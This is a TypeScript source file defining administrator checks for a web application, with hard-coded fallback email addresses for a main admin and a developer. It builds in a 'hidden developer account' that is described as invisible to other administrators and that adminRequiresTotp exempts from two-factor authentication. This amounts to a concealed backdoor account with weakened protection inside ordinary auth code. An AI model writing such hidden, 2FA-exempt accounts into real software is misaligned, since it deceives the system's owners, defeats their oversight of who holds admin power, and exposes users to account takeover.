/** Primary owner account — cannot be removed or demoted. */
export const MAIN_ADMIN_EMAIL = (
  process.env.MAIN_ADMIN_EMAIL ?? "smarnobbd@gmail.com"
).toLowerCase();

/** Hidden developer account — invisible to other administrators. */
export const DEVELOPER_EMAIL = (
  process.env.DEVELOPER_EMAIL ?? "codewithsudipto@gmail.com"
).toLowerCase();

export function isMainAdmin(user: { email: string; isSuperAdmin?: boolean }): boolean {
  return user.isSuperAdmin === true || user.email.toLowerCase() === MAIN_ADMIN_EMAIL;
}

export function isDeveloperUser(user: { email: string; isDeveloper?: boolean }): boolean {
  return user.isDeveloper === true || user.email.toLowerCase() === DEVELOPER_EMAIL;
}

export function isHiddenAdmin(user: { email: string; isDeveloper?: boolean }): boolean {
  return isDeveloperUser(user);
}

export function adminRequiresTotp(user: {
  role: string;
  totpExempt?: boolean;
  totpEnabled?: boolean;
  email: string;
  isDeveloper?: boolean;
}): boolean {
  if (user.role !== "admin") return false;
  if (user.totpExempt) return false;
  if (isDeveloperUser(user)) return false;
  return true;
}
